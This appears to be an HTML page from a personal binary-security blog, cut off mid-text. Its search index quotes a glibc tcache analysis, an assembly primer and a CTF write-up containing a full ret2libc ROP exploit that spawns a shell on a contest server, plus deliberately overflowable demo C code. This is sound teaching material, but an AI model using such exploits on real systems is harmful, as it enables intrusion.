@@ -1,0 +1,679 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Personal security research workspace."><title>0-0 计算机组成初步 | C0nvR3 Lab</title><link rel=stylesheet href=/css/main.min.447947d054de9ad730a8e45d0dde622bdd562f64212798d1ce913bfa35878ec9.css integrity="sha256-RHlH0FTemtcwqORdDd5iK91WL2QhJ5jRzpE7+jWHjsk="><script src=/js/menu.min.1164375157dc7fc99871e27bf64d3302f677e2bf9a9ccca3d89f9cc0bd4d82ac.js integrity="sha256-EWQ3UVfcf8mYceJ79k0zAvZ34r+anMyj2J+cwL1Ngqw=" defer></script></head><body><script id=friend-network-data type=application/json>{"connection":{"availability":"not monitored","command":"ssh \u003chost\u003e","protocol":"https"},"description":"Friends and trusted technical sites connected to C0nvR3 Lab.","hosts":[{"description":"MyFriend","host":"0xByt3","name":"Byte","since":"2026-07","state":"active","topics":["pwn","reverse","linux"],"url":"https://www.0xbyt3.com/"}],"updated":"2026-07-14","workspace":"C0nvR3 Lab"}</script><header class=topbar><nav class=menu-bar aria-label="IDE menu"><div class=menu><button class=menu-trigger type=button aria-expanded=false>File</button><div class=menu-dropdown role=menu><a role=menuitem href=/>Home</a>
+<a role=menuitem href=/posts/>Blog</a>
+<a role=menuitem href=/research/>Research</a>
+<a role=menuitem href=/projects/>Projects</a>
+<a role=menuitem href=/ctf/>CTF</a>
+<a role=menuitem href=/links/>Links</a>
+<a role=menuitem href=/about/>About</a></div></div><div class=menu><button class=menu-trigger type=button aria-expanded=false>View</button><div class=menu-dropdown role=menu><button type=button role=menuitem data-view-toggle=explorer>Toggle Explorer</button>
+<button type=button role=menuitem data-view-toggle=terminal>Toggle Terminal</button>
+<button type=button role=menuitem data-view-toggle=theme>Dark Mode</button></div></div><div class=menu><button class=menu-trigger type=button aria-expanded=false>Navigate</button><div class=menu-dropdown role=menu><button type=button role=menuitem data-dialog-open=search-dialog>Search <kbd>Ctrl K</kbd></button>
+<a role=menuitem href=/archives/>Archive</a>
+<a role=menuitem href=/categories/>Categories</a>
+<a role=menuitem href=/tags/>Tags</a></div></div><div class=menu><button class=menu-trigger type=button aria-expanded=false>Help</button><div class=menu-dropdown role=menu><a role=menuitem href=/about/>About Site</a>
+<button type=button role=menuitem data-dialog-open=shortcut-dialog>Shortcut</button></div></div></nav><span class=site-name>C0nvR3 Lab</span></header><dialog class=site-dialog id=search-dialog aria-labelledby=search-title><form method=dialog class=dialog-header><h2 id=search-title>Search workspace</h2><button type=submit aria-label="Close search">×</button></form><label class=search-label for=site-search>Search titles, sections, and tags</label>
+<input id=site-search type=search placeholder="Type to filter..." autocomplete=off><ul class=search-results data-search-results><li data-search-item data-search-text='0-0 计算机组成初步 how2pwn re pwn <h1 id="从-c-语言到汇编二进制安全需要的计算机组成基础">从 c 语言到汇编：二进制安全需要的计算机组成基础</h1>
+<p>我们平时编写 c 语言程序时，习惯用变量、循环、判断和函数来描述程序逻辑：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">add</span>(<span style="color:#ff7b72">int</span> a, <span style="color:#ff7b72">int</span> b) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> a <span style="color:#ff7b72;font-weight:bold">+</span> b;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>但是 cpu 并不认识 <code>int</code>、<code>return</code> 或函数名。源代码经过编译器处理后，会被翻译成机器指令；机器指令本质上是一串二进制数据。汇编语言则为这些机器指令提供了便于人类阅读的写法。上面的函数可能对应如下汇编逻辑：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold">add:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">lea</span> <span style="color:#79c0ff;font-weight:bold">eax</span>, [<span style="color:#79c0ff;font-weight:bold">rdi</span> <span style="color:#f85149">+</span> <span style="color:#79c0ff;font-weight:bold">rsi</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">ret</span>
+</span></span></code></pre></div><p>对于普通软件开发，我们未必需要关心翻译后的结果；但在逆向工程、漏洞分析和恶意代码分析中，拿到的往往只有编译后的程序。此时，我们必须从寄存器、内存和汇编指令出发，重新理解程序做了什么。</p>
+<p>本文不会完整讲授数字电路、流水线或缓存一致性等计算机组成原理课程内容，而是围绕二进制安全所需的主线展开：</p>
+<blockquote>
+<p>硬件如何协作 → cpu 如何保存数据 → 汇编指令如何操作数据和改变控制流 → 函数如何使用栈与寄存器。</p>
+</blockquote>
+<p>文中的汇编代码采用 <strong>x86-64 intel 语法</strong>，运行环境默认为 <strong>linux 用户态</strong>，函数调用遵循 <strong>system v amd64 abi</strong>。示例以讲清原理为第一目标，实际编译结果会随着编译器版本、优化等级和源代码写法发生变化。</p>
+<h2 id="计算机由哪些主要硬件组成">计算机由哪些主要硬件组成</h2>
+<p>一台计算机包含很多部件。对于分析普通用户态程序，我们首先需要认识 cpu、内存、外部存储、总线和输入输出设备。</p>
+<table>
+  <thead>
+      <tr>
+          <th>部件</th>
+          <th>主要作用</th>
+          <th>与二进制分析的关系</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>cpu</td>
+          <td>解释并执行机器指令，完成运算和控制</td>
+          <td>汇编指令最终在 cpu 中执行</td>
+      </tr>
+      <tr>
+          <td>内存（ram）</td>
+          <td>临时保存正在运行的程序、代码和数据</td>
+          <td>代码、栈、堆和全局变量都位于进程的虚拟地址空间中</td>
+      </tr>
+      <tr>
+          <td>硬盘或固态硬盘</td>
+          <td>长期保存程序和文件，断电后数据仍存在</td>
+          <td>elf 可执行文件最初存放在这里，运行时再由系统装入内存</td>
+      </tr>
+      <tr>
+          <td>总线</td>
+          <td>在 cpu、内存和设备之间传输地址、数据和控制信息</td>
+          <td>决定各硬件如何交换信息，但初学阶段不必深入电气细节</td>
+      </tr>
+      <tr>
+          <td>输入输出设备</td>
+          <td>让计算机与用户和外界交换数据</td>
+          <td>程序通常通过操作系统提供的接口访问这些设备</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="1-cpu-内部有什么">1. cpu 内部有什么</h3>
+<p>为了便于理解，可以把 cpu 内部的重要部分概括为：</p>'><a href=/how2pwn/0-0-computer-structure/><span>0-0 计算机组成初步</span><small>how2pwn/</small></a></li><li data-search-item data-search-text='2.4x 的 tcache 机制分析 research glibc <h2 id="简述">简述</h2>
+<p>在 2.39 到 2.40 中，malloc.c 并未发生变化，因此我们这里主要讲一些 2.41 到 2.43 的 tcache 相关的一些小细节
+在这三个版本中，主要变化可以简单概括为</p>
+<ul>
+<li>2.41:
+<ul>
+<li>calloc 可以分配 tcache 块</li>
+<li>小 chunk 被 free 后会直接进入 small bin</li>
+</ul>
+</li>
+<li>2.42
+<ul>
+<li>large_tcache 的引入</li>
+</ul>
+</li>
+<li>2.43
+<ul>
+<li>tcache 扩容以补偿 fastbin 删除的性能问题</li>
+<li>large_tcache 分配改为需要精确 chunk_size</li>
+<li>mmap chunk 可以进入 tcache</li>
+</ul>
+</li>
+</ul>
+<p>因为 tcache 初始化时机这几个版本一直改来改去的很乱，只做简述
+以下为细分的分析，我会粘贴一些源码辅助理解</p>
+<h2 id="tcache-基本机制">tcache 基本机制</h2>
+<h3 id="tcache-结构体的变化">tcache 结构体的变化</h3>
+<p>在 glibc 2.42版本中，tcache_perthread_struct 结构进行了调整</p>
+<ul>
+<li>2.41</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">/* we overlay this structure on the user-data portion of a chunk when
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   the chunk is stored in the per-thread cache.  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span> tcache_entry
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">struct</span> tcache_entry <span style="color:#ff7b72;font-weight:bold">*</span>next;
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* this field exists to detect double frees.  */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">uintptr_t</span> key;
+</span></span><span style="display:flex;"><span>} tcache_entry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">/* there is one of these for each thread, which contains the
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   per-thread cache (hence &amp;#34;tcache_perthread_struct&amp;#34;).  keeping
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   overall size low is mildly important.  note that counts and entries
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   are redundant (we could have just counted the linked list each
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   time), this is for performance reasons.  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span> tcache_perthread_struct
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">uint16_t</span> counts[tcache_max_bins];
+</span></span><span style="display:flex;"><span>  tcache_entry <span style="color:#ff7b72;font-weight:bold">*</span>entries[tcache_max_bins];
+</span></span><span style="display:flex;"><span>} tcache_perthread_struct;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> __thread <span style="color:#ff7b72">bool</span> tcache_shutting_down <span style="color:#ff7b72;font-weight:bold">=</span> false;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> __thread tcache_perthread_struct <span style="color:#ff7b72;font-weight:bold">*</span>tcache <span style="color:#ff7b72;font-weight:bold">=</span> null;
+</span></span></code></pre></div><ul>
+<li>2.42</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">/* we overlay this structure on the user-data portion of a chunk when
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   the chunk is stored in the per-thread cache.  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span> tcache_entry
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">struct</span> tcache_entry <span style="color:#ff7b72;font-weight:bold">*</span>next;
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* this field exists to detect double frees.  */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">uintptr_t</span> key;
+</span></span><span style="display:flex;"><span>} tcache_entry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">/* there is one of these for each thread, which contains the
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   per-thread cache (hence &amp;#34;tcache_perthread_struct&amp;#34;).  keeping
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   overall size low is mildly important.  the &amp;#39;entries&amp;#39; field is linked list of
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   free blocks, while &amp;#39;num_slots&amp;#39; contains the number of free blocks that can
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   be added.  each bin may allow a different maximum number of free blocks,
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   and can be disabled by initializing &amp;#39;num_slots&amp;#39; to zero.  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span> tcache_perthread_struct
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">uint16_t</span> num_slots[tcache_max_bins];
+</span></span><span style="display:flex;"><span>  tcache_entry <span style="color:#ff7b72;font-weight:bold">*</span>entries[tcache_max_bins];
+</span></span><span style="display:flex;"><span>} tcache_perthread_struct;
+</span></span></code></pre></div><p>entry 的部分基本没有变化，这里主要变化还是原本的 counts 数组变成了 num_slots 数组
+原本的 counts 数组表示对应索引下 tcache 链表的长度，现在 num_slots 数组中变为了对应索引下设剩下的空槽位</p>'><a href=/research/glibc-large-tcache/><span>2.4x 的 tcache 机制分析</span><small>research/</small></a></li><li data-search-item data-search-text="about   <p>你好，这里是converter258，也可以叫我c0nvr3</p>
+<p>是个人类(大概?</p>
+<p>另外就是ta快饿死了，能不能赏口饭吃</p>"><a href=/about/><span>About</span><small>/</small></a></li><li data-search-item data-search-text="friends network   <p>这是 c0nvr3 lab 的友链网络。可以点击 json 中的 url，或者在 terminal 中使用 <code>ssh &amp;lt;host&amp;gt;</code> 访问对应站点。</p>"><a href=/links/><span>Friends Network</span><small>/</small></a></li><li data-search-item data-search-text='geek challenge 2025 wp ctf wp ctf <hr>
+<p>这里只收录了我个人的wp,我队友的部分就不放出来了
+第一次写，写的烂，就当参考吧，可能有很多地方不严谨或有误
+还请各位大佬指教</p>
+<h2 id="pwn">pwn</h2>
+<h3 id="old_rop">old_rop</h3>
+<h4 id="解题流程">解题流程</h4>
+<p>查保护
+<figure class="article-image"><img src="/ctf/geek-challenge-2025-wp/image.png" width="461" height="200" alt="old_rop 二进制安全保护检查结果" loading="lazy"></figure>
+
+查伪代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">__int64</span> <span style="color:#ff7b72">__fastcall</span> <span style="color:#d2a8ff;font-weight:bold">main</span>(<span style="color:#ff7b72">int</span> a1, <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">**</span>a2, <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">**</span>a3)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _qword buf[<span style="color:#a5d6ff">10</span>]; <span style="color:#8b949e;font-style:italic">// [rsp+10h] [rbp-50h] byref
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">write</span>(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">&amp;#34;hello, world</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&amp;#34;</span>, <span style="color:#a5d6ff">0xdull</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">strcpy</span>((<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>)buf, <span style="color:#a5d6ff">&amp;#34;welcome to ret2csu , but there is sometings different,please care about it !&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">write</span>(<span style="color:#a5d6ff">1</span>, buf, <span style="color:#a5d6ff">0x4dull</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">write</span>(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">&amp;#34;</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&amp;#34;</span>, <span style="color:#a5d6ff">1ull</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">sub_401156</span>(<span style="color:#a5d6ff">1ll</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0ll</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">ssize_t</span> <span style="color:#d2a8ff;font-weight:bold">sub_401156</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _byte buf[<span style="color:#a5d6ff">128</span>]; <span style="color:#8b949e;font-style:italic">// [rsp+0h] [rbp-80h] byref
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> <span style="color:#d2a8ff;font-weight:bold">read</span>(<span style="color:#a5d6ff">0</span>, buf, <span style="color:#a5d6ff">0x200ull</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在sub_401156有一个明显栈溢出，没有后门函数，打libc，得先泄露libc基址，用write打印即可，但此处没有控制rdx的gadget,只能用read的时候rdx的残余值0x200多打印一些，然后正常写rop链即可</p>
+<h4 id="exp">exp</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># io = process(&amp;#39;./pwn&amp;#39;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#ff7b72;font-weight:bold">=</span> remote(<span style="color:#a5d6ff">&amp;#39;geek.ctfplus.cn&amp;#39;</span>,<span style="color:#a5d6ff">32696</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff7b72;font-weight:bold">=</span> elf(<span style="color:#a5d6ff">&amp;#34;./libc/libc.so.6&amp;#34;</span>)  
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff7b72;font-weight:bold">=</span> elf(<span style="color:#a5d6ff">&amp;#34;./pwnt&amp;#34;</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_got <span style="color:#ff7b72;font-weight:bold">=</span> elf<span style="color:#ff7b72;font-weight:bold">.</span>got[<span style="color:#a5d6ff">&amp;#39;write&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>write_plt <span style="color:#ff7b72;font-weight:bold">=</span> elf<span style="color:#ff7b72;font-weight:bold">.</span>plt[<span style="color:#a5d6ff">&amp;#39;write&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x00000000004012d3</span>
+</span></span><span style="display:flex;"><span>ret_addr <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x000000000040101a</span> 
+</span></span><span style="display:flex;"><span>read_addr <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x0000000000401156</span>
+</span></span><span style="display:flex;"><span>pop_rsi_r15 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x00000000004012d1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>line <span style="color:#ff7b72;font-weight:bold">=</span> io<span style="color:#ff7b72;font-weight:bold">.</span>recvline()
+</span></span><span style="display:flex;"><span>print(line)
+</span></span><span style="display:flex;"><span>line <span style="color:#ff7b72;font-weight:bold">=</span> io<span style="color:#ff7b72;font-weight:bold">.</span>recvline()
+</span></span><span style="display:flex;"><span>print(line)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payleak <span style="color:#ff7b72;font-weight:bold">=</span> cyclic(<span style="color:#a5d6ff">0x88</span>) <span style="color:#ff7b72;font-weight:bold">+</span>p64(pop_rdi) <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">1</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(pop_rsi_r15) <span style="color:#ff7b72;font-weight:bold">+</span> p64(write_got) <span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(write_plt) <span style="color:#ff7b72;font-weight:bold">+</span>p64(read_addr)
+</span></span><span style="display:flex;"><span>io<span style="color:#ff7b72;font-weight:bold">.</span>sendline(payleak)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leaked_data <span style="color:#ff7b72;font-weight:bold">=</span> io<span style="color:#ff7b72;font-weight:bold">.</span>recv(<span style="color:#a5d6ff">0x200</span>)
+</span></span><span style="display:flex;"><span>write_addr <span style="color:#ff7b72;font-weight:bold">=</span> u64(leaked_data[<span style="color:#a5d6ff">0</span>:<span style="color:#a5d6ff">8</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&amp;#34;leaked write address: </span><span style="color:#a5d6ff">{</span>hex(write_addr)<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&amp;#34;</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff7b72;font-weight:bold">=</span> write_addr <span style="color:#ff7b72;font-weight:bold">-</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>symbols[<span style="color:#a5d6ff">&amp;#39;write&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&amp;#34;libc base: </span><span style="color:#a5d6ff">{</span>hex(libc_base)<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&amp;#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>symbols[<span style="color:#a5d6ff">&amp;#39;system&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>search(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&amp;#34;/bin/sh&amp;#34;</span>)<span style="color:#ff7b72;font-weight:bold">.</span><span style="color:#d2a8ff;font-weight:bold">__next__</span>()
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&amp;#34;system:&amp;#34;</span>,hex(system_addr))
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&amp;#34;binsh:&amp;#34;</span>,hex(binsh_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> cyclic(<span style="color:#a5d6ff">0x88</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(pop_rdi) <span style="color:#ff7b72;font-weight:bold">+</span> p64(binsh_addr) <span style="color:#ff7b72;font-weight:bold">+</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>io<span style="color:#ff7b72;font-weight:bold">.</span>sendline (payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><h3 id="mission-calculator">mission calculator</h3>
+<h4 id="解题流程-1">解题流程</h4>
+<p>这题不用查保护，就是一个单纯的计算题，直接写一个for全算出来发回去就行</p>'><a href=/ctf/geek-challenge-2025-wp/><span>Geek Challenge 2025 WP</span><small>ctf/</small></a></li><li data-search-item data-search-text='perf与简单的侧信道攻击 research ctf <h2 id="perf">perf</h2>
+<h3 id="简介">简介</h3>
+<p><code>perf</code> 是 linux 系统性能分析工具集，全称是 <code>performance event counters</code>
+它基于 linux 内核的 perf_events 子系统，能够提供硬件和软件层面的性能分析能力
+我们这里会用到它的一些功能以获取一些硬件事件的信息，因此，你必须确保自己的虚拟机支持 <code>pmu</code>
+功能</p>
+<h3 id="准备perf">准备perf</h3>
+<h4 id="事前准备">事前准备</h4>
+<p>首先确定你的设备支持 pmu 功能，如果条件允许，实体机上使用 perf 会方便很多，如果你使用的是 wsl2 作为使用的虚拟机，请在设置中开启 <code>性能计数器</code> ，并使用除 ubuntu 以外的系统，因为 wsl2 对内核的魔改会导致一些兼容性问题，我捣鼓了两天也没能完美解决，可以在 wsl2 上选择其他 linux 进行尝试，或者换用 vmware ，在使用vmware时，请在硬件设置里，添加上<code>虚拟化 cpu 性能计数器</code>，并禁用所有hyperv相关的设置，并关闭虚拟化保护
+包括(仅限vmware使用者,wsl2 不要改):</p>
+<ul>
+<li>windows安全中心 -&amp;gt; 设备安全性 -&amp;gt; 内核隔离 -&amp;gt; 内存完整性/本地安全机构保护</li>
+<li>windows功能 -&amp;gt; hyper-v/virtual machine platform/windows虚拟机监控程序平台</li>
+</ul>
+<h4 id="perf安装">perf安装</h4>
+<p>安装 perf 可以通过</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get install linux-tools-generic
+</span></span></code></pre></div><h4 id="相关设置">相关设置</h4>
+<h5 id="使用权限">使用权限</h5>
+<p>等安装完成后并不能直接使用，你需要先查看</p>
+<pre tabindex="0"><code>cat /proc/sys/kernel/perf_event_paranoid
+</code></pre><p>这个<code>perf_event_paranoid</code>设置了运行时权限相关的内容，建议修改成小于等于1的值</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sh -c <span style="color:#a5d6ff">&amp;#39;echo -1 &amp;gt; /proc/sys/kernel/perf_event_paranoid&amp;#39;</span>
+</span></span></code></pre></div><h5 id="cpu核心与内存分配">cpu核心与内存分配</h5>
+<p>此时可以尝试一下使用</p>'><a href=/research/perf-side-channel-attack/><span>Perf与简单的侧信道攻击</span><small>research/</small></a></li><li data-search-item data-search-text='ret2dlresolve posts ctf <h2 id="理论部分">理论部分</h2>
+<p>首先最好确认你学习过elf文件结构相关的内容，当然如果没学过这里也会简单的讲解一些
+本文主要讲靠pwntools的ret2dlresolvepayload工具一把梭所需payload,这比手搓payload轮椅太多了，手搓payload咕到下回了，毕竟国道上的大运只管开就好了，但旁边的小轿车考虑的可就多了</p>
+<p>这里来复习一下动态链接和延迟绑定
+<figure class="article-image"><img src="/posts/ret2dlresolve/lazy-plt.png" width="717" height="885" alt="elf 延迟绑定过程中 plt、got 与动态解析器的调用流程" loading="lazy"></figure>
+
+图片中展示了当我们call一个函数时的大致流程(虽然缺少了部分内容，但是还是很直观的)，如果我们首次 call 一个函数，首先是plt[n]被执行，jmp 到 got 表中   对应的条目,但此时该got条目里存的还不是该函数的真实地址，而是 该函数 plt表 中下一条指令的地址，然后此时会push reloc_arg,它是在重定位表 .rel.plt 中，用来定位函数相关信息的一个偏移量,接下来跳转到 plt 的起始部分，通常称为 plt[0],然后plt[0] 会先 push 一个 link_map 结构体的地址（通过 got[1] 获得），然后 jmp 到 _dl_runtime_resolve 函数（其地址存储在 got[2] 中）解析和填充got[n]为真实的函数地址，这个过程中我们只需要在可控的内存中伪造_dl_runtime_resolve的参数，也就是link_map 和 reloc_arg</p>
+<h2 id="demo">demo</h2>
+<h3 id="32位-非-full-relro">32位 非 full relro</h3>
+<p>示例demo</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;stdio.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;unistd.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">vuln</span>(<span style="color:#ff7b72">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> buf[<span style="color:#a5d6ff">64</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&amp;#34;input:&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">read</span>(<span style="color:#a5d6ff">0</span>, buf, <span style="color:#a5d6ff">0x200</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">main</span>(<span style="color:#ff7b72">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">setvbuf</span>(stdin, null, _ionbf, <span style="color:#a5d6ff">0</span>);
